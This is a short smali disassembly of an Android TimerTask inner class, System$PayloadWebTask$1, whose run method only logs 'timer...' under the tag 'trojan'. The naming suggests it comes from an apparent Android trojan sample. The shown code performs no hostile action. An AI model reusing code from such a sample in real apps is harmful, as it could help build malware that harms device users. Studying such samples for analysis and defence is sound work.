.class Los/system/System$PayloadWebTask$1;
.super Ljava/util/TimerTask;
.source "System.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Los/system/System$PayloadWebTask;->onPreExecute()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$1:Los/system/System$PayloadWebTask;


# direct methods
.method constructor <init>(Los/system/System$PayloadWebTask;)V
    .locals 0

    .prologue
    .line 361
    iput-object p1, p0, Los/system/System$PayloadWebTask$1;->this$1:Los/system/System$PayloadWebTask;

    invoke-direct {p0}, Ljava/util/TimerTask;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 2

    .prologue
    .line 364
    const-string v0, "trojan"

    const-string v1, "timer..."

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 365
    return-void
.end method
